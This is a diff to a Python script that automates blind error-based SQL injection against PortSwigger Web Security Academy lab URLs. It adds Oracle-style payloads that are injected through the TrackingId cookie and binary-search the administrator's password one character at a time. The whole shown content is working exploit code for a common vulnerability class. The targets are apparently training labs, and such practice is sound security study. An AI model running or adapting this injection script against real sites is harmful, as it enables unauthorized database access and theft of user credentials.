@@ -27,12 +27,22 @@ def get_password_with_boolean_based_SQLi():
             payload_parameter1 = f"{operator1}'{letter[mid_point]}'"
             payload_parameter2 = f"{operator2}'{letter[mid_point]}'"
             success = False
+            bad_sql1 = f"'||(SELECT CASE WHEN SUBSTR(password,{indice},1){payload_parameter1} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+            bad_sql2 = f"'||(SELECT CASE WHEN SUBSTR(password,{indice},1){payload_parameter2} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+            cookies1 = {
+                    'TrackingId': f"1cSXBZkjYkwq7Prk{bad_sql1}",
+                    'session': '6XJCogtISGT4Iv8bivhkf1uvQwoVqSSc'
+                    }
+            cookies2 = {
+                    'TrackingId': f"1cSXBZkjYkwq7Prk{bad_sql2}",
+                    'session': '6XJCogtISGT4Iv8bivhkf1uvQwoVqSSc'
+                    }
                     
-        url = 'https://0a0800dc04395ece80fe3f9d009700b9.web-security-academy.net/login'
+        url = 'https://0a0d00bb030f829981c516e400b0000e.web-security-academy.net/'
         output_message(f"[++] Tested payload : {payload_parameter1}, {payload_parameter2}")
         output_message(f"[++] Current terminal : low = {low_bound}, higt = {high_bound}, binary_average = {mid_point}")
         output_message(f"[++] Index number : {indice}")
-        status_code, status_code2= sending_payload_for_boolean_based_SQLi(payload_parameter1, payload_parameter2, url, indice)
+        status_code, status_code2= sending_payload_for_boolean_based_SQLi(payload_parameter1, payload_parameter2, url, indice, cookies1, cookies2)
        
         print(f"Status_code: {status_code}, Status_code2: {status_code2}\n")
 
@@ -74,7 +84,7 @@ def get_password_with_boolean_based_SQLi():
             output_message(f"[++] Tested payload : {payload_parameter1}, {payload_parameter2}")
             output_message(f"[++] Current terminal : low = {low_bound}, higt = {high_bound}, binary_average = {mid_point}")
             output_message(f"[++] Index number : {indice}")
-            status_code, status_code2 = sending_payload_for_boolean_based_SQLi(payload_parameter1, payload_parameter2, url, indice)
+            status_code, status_code2 = sending_payload_for_boolean_based_SQLi(payload_parameter1, payload_parameter2, url, indice, cookies1, cookies2)
             print(f"Status_code: {status_code}, Status_code2: {status_code2}\n")
 
             
